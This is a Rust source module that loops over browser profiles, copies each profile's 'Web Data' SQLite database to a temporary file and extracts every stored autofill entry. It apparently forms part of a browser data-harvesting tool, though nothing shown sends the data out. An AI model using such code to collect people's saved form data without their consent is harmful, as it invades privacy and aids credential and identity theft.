use rusqlite::Connection;
use std::path::PathBuf;

#[allow(dead_code)]
#[derive(Debug)]
pub(super) struct AutoFillEntry {
    k: String,
    v: String,
}

// #[cfg]
pub(super) async fn get_autofill(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
) -> std::io::Result<Vec<Vec<AutoFillEntry>>> {
    let mut result = Vec::<Vec<AutoFillEntry>>::with_capacity(profiles.len());

    for profile in profiles {
        path.push(profile);
        path.push("Web Data");

        #[cfg(target_os = "windows")]
        {
            use std::os::windows::fs::MetadataExt;
            if let Ok(f) = std::fs::metadata(path.as_os_str()) {
                if f.file_size() == 0 {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        "Database is empty",
                    ));
                }
            }
        }
        #[cfg(target_os = "linux")]
        {
            use std::os::linux::fs::MetadataExt;
            if let Ok(f) = std::fs::metadata(path.as_os_str()) {
                if f.st_size() == 0 {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::Other,
                        "Database is empty",
                    ));
                }
            }
        }
        #[cfg(not(any(target_os = "windows", target_os = "linux")))]
        {
            compile_error!("Unsupported target.");
        }

        // Copy the file to the temporary folder
        std::fs::copy(&path, tempfile).unwrap();

        // Connect to the SQLite database
        let conn = Connection::open(tempfile).unwrap();
        let mut statement = conn
            .prepare("SELECT * FROM autofill WHERE value IS NOT NULL")
            .unwrap();

        // Execute the command and collect the data
        let data_iter = statement
            .query_map([], |row| {
                Ok(AutoFillEntry {
                    k: row.get::<usize, String>(0).unwrap(),
                    v: row.get::<usize, String>(1).unwrap(),
                    // row.get::<usize, String>(2).unwrap(),
                    // ignored due to same as val
                })
            })
            .unwrap();

        let data = data_iter
            .into_iter()
            .map(|x| x.unwrap())
            .collect::<Vec<AutoFillEntry>>();
        result.push(data);

        std::fs::remove_file(tempfile).unwrap();
        path.pop();
        path.pop();
    }

    Ok(result)
}
